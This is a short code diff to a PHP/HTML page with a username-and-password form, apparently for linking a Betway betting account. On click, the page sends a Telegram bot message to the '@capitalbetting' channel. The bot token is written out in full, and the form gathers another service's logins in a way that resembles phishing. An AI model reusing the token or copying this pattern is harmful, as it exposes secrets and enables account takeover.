@@ -16,11 +16,17 @@ echo <<< END_OF_TEXT
 <input type="text" name="name" placeholder="USERNAME" style="border-radius: 10px;"  >
 <input type="text" name="name" placeholder="PASSWORD" style="border-radius: 10px;"  >
 <input type="submit" value="LINK" onclick="myFunction()" >
+<span id="result"></span>
 <script>
 function myFunction() {
+  var selectedOption = $("input:radio[name=selector]:checked").val()
+
   let xhr = new XMLHttpRequest();
   fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=LINKED NEW ACCOUNT  OF BETWAY IN CAPITALBETTING");
 
+
+      
+ 
   
 }
 </script>
